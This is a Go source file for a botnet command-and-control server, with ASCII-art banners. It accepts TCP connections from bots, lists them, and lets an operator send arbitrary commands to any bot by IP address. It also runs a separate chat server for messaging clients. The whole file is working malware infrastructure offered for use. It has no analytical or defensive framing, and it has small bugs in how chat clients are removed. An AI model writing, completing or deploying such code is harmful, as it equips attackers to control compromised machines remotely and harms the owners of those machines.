package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Server struct {
	ip   string
	port string
}
type Clients struct {
	ip   string
	port string
	conn net.Conn
}

var clients []Clients
var chat []Clients
var mu sync.Mutex

var mode = false

func handleMsgListening(conn net.Conn) (string, error) {
	MsgLength := make([]byte, 4)
	_, err := io.ReadFull(conn, MsgLength)
	if err != nil {
		if err == io.EOF {
			fmt.Println("The User Has Been Disconnected ahahaha", err)
			return "", err
		}
		fmt.Println("There was an error accured", err)
		return "", err
	}
	fullMsgLength := binary.BigEndian.Uint32(MsgLength)
	realMsg := make([]byte, fullMsgLength)
	if _, err := io.ReadFull(conn, realMsg); err != nil {
		fmt.Print("There Was an error during Message reading", err)
	}
	physicalMessage := string(realMsg)
	return physicalMessage, nil
}

func handleEachClient(conn net.Conn) {
	defer func() {
		removeClient(conn)
		conn.Close()
	}()
	for {
		msg, err := handleMsgListening(conn)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Printf("\rClient> %s\nServer> ", msg)
	}
}

func handleChatClient(conn net.Conn) {
	defer func() {
		removeClient(conn)
		conn.Close()
	}()
	for {
		msg, err := handleMsgListening(conn)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Printf("\rClient> %s\nServer> ", msg)
	}
}
func SendOverTCP(client Clients, msg string) error {
	msglength := make([]byte, 4)
	binary.BigEndian.PutUint32(msglength, uint32(len(msg)))
	if _, err := client.conn.Write(msglength); err != nil {
		if err == io.EOF {
			fmt.Println("Print The Connection with User Has Ended")
			return err
		}
		fmt.Println("There Was a connection problem")
		return err
	}

	realcommand := []byte(msg)
	if _, err := client.conn.Write(realcommand); err != nil {
		if err == io.EOF {
			fmt.Println("Print The Connection with User Has Ended")
			return err
		}
		fmt.Println("There Was a connection problem")
		return err
	}
	fmt.Printf("Server> ")
	return nil
}
func Shell() {
	fmt.Printf("Server> ")
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text()
		parts := strings.SplitN(command, " ", 3)
		if command == "set On" {
			mode = true
			continue
		}
		if mode == false {
			if parts[0] == "command" {
				var target Clients
				for i := range clients {
					if clients[i].ip == parts[1] {
						target = clients[i]
						err := SendOverTCP(target, parts[2])
						if err != nil {
							fmt.Println(err)
							continue
						}
					}
				}
			}
			if parts[0] == "DisplayAllBot" {
				DisplayAllBot()
				continue
			}
		} else {
			if parts[0] == "text" {
				var target Clients
				for i := range chat {
					if chat[i].ip == parts[1] {
						target = chat[i]
						err := SendOverTCP(target, parts[2])
						if err != nil {
							fmt.Println(err)
							continue
						}
					}
				}
			}
			if parts[0] == "DisplayAllChat" {
				DisplayAllChat()
				continue
			}
		}
	}
}
func (s *Server) StartServer() {
	listen, err := net.Listen("tcp", s.ip+":"+s.port)
	if err != nil {
		log.Fatal("There is a problem Runing the server")
	}
	defer listen.Close()
	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Fatal("Error Listening and Accepting")
		}
		mu.Lock()
		remoteAddr := conn.RemoteAddr().(*net.TCPAddr)
		ipOnly := remoteAddr.IP.String()

		clientTemplate := Clients{
			conn: conn,
			ip:   ipOnly,
			port: strconv.Itoa(remoteAddr.Port),
		}
		clients = append(clients, clientTemplate)
		mu.Unlock()

		go handleEachClient(conn)

	}
}

func (s *Server) StartChatServer() {
	listen, err := net.Listen("tcp", s.ip+":"+s.port)
	if err != nil {
		log.Fatal("There is a problem Runing the server")
	}
	defer listen.Close()
	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Fatal("Error Listening and Accepting")
		}
		mu.Lock()
		remoteAddr := conn.RemoteAddr().(*net.TCPAddr)
		ipOnly := remoteAddr.IP.String()

		clientTemplate := Clients{
			conn: conn,
			ip:   ipOnly,
			port: strconv.Itoa(remoteAddr.Port),
		}
		chat = append(chat, clientTemplate)
		mu.Unlock()

		go handleChatClient(conn)

	}
}

func DisplayAllBot() {
	fmt.Println()
	fmt.Println("╔════════════ Connected Users ════════════╗")

	if len(clients) == 0 {
		fmt.Println("║ No users connected                       ║")
		fmt.Println("╚═════════════════════════════════════════╝")
		return
	}

	for i, user := range clients {
		fmt.Printf(
			"║ [%d] IP: %-20s Port: %-8s ║\n",
			i+1,
			user.ip,
			user.port,
		)
	}

	fmt.Println("╚═════════════════════════════════════════╝")
	fmt.Printf("Server> ")
}

func DisplayAllChat() {
	fmt.Println()
	fmt.Println("╔════════════ Connected Users ════════════╗")

	if len(chat) == 0 {
		fmt.Println("║ No users connected                       ║")
		fmt.Println("╚═════════════════════════════════════════╝")
		return
	}

	for i, user := range chat {
		fmt.Printf(
			"║ [%d] IP: %-20s Port: %-8s ║\n",
			i+1,
			user.ip,
			user.port,
		)
	}

	fmt.Println("╚═════════════════════════════════════════╝")
	fmt.Printf("Server> ")
}

func main() {

	FirstLogo := `
  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$        /$$$$$$  /$$      /$$  /$$$$$$  /$$$$$$$ 
 /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$  | $$|_  $$_/       /$$__  $$| $$$    /$$$ /$$__  $$| $$__  $$
| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  | $$  | $$        | $$  \ $$| $$$$  /$$$$| $$  \ $$| $$  \ $$
|  $$$$$$ | $$$$$$$$| $$  | $$| $$$$$$$$| $$  | $$| $$  | $$  | $$        | $$  | $$| $$ $$/$$ $$| $$$$$$$$| $$$$$$$/
 \____  $$| $$__  $$| $$  | $$| $$__  $$| $$  | $$| $$  | $$  | $$        | $$  | $$| $$  $$$| $$| $$__  $$| $$__  $$
 /$$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$  | $$        | $$  | $$| $$\  $ | $$| $$  | $$| $$  \ $$
|  $$$$$$/| $$  | $$| $$$$$$$/| $$  | $$|  $$$$$$/|  $$$$$$/ /$$$$$$      |  $$$$$$/| $$ \/  | $$| $$  | $$| $$  | $$
 \______/ |__/  |__/|_______/ |__/  |__/ \______/  \______/ |______/       \______/ |__/     |__/|__/  |__/|__/  |__/
                                                                                                                                                                                                                                                                                                          
                                                                                                             
                                                                                                             
	`
	SecondLogo := `
⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	`
	fmt.Println(SecondLogo)
	time.Sleep(2 * time.Second)
	fmt.Println(FirstLogo)
	var ip, port string

	fmt.Print("\n Write The IP of Botnet Server: ")
	fmt.Scanln(&ip)

	fmt.Print("Write The Port of Botnet Server: ")
	fmt.Scanln(&port)

	server := Server{
		ip:   ip,
		port: port,
	}

	go func() {
		server.StartServer()
	}()
	fmt.Println("BotNet Server is On")
	time.Sleep(1 * time.Second)
	fmt.Print("\n Write The IP of Botnet Server: ")
	fmt.Scanln(&ip)

	fmt.Print("Write The Port of Botnet Server: ")
	fmt.Scanln(&port)

	Secondserver := Server{
		ip:   ip,
		port: port,
	}

	go func() {
		Secondserver.StartChatServer()
	}()

	fmt.Println("Chat Server Is On")

	Shell()
}

func removeClient(conn net.Conn) {
	mu.Lock()
	defer mu.Unlock()

	for i, c := range clients {
		if c.conn == conn {
			clients = append(clients[:i], clients[i+1:]...)
			break
		}
	}
}

func removeChat(conn net.Conn) {
	mu.Lock()
	defer mu.Unlock()

	for i, c := range chat {
		if c.conn == conn {
			chat = append(chat[:i], chat[i+1:]...)
			break
		}
	}
}
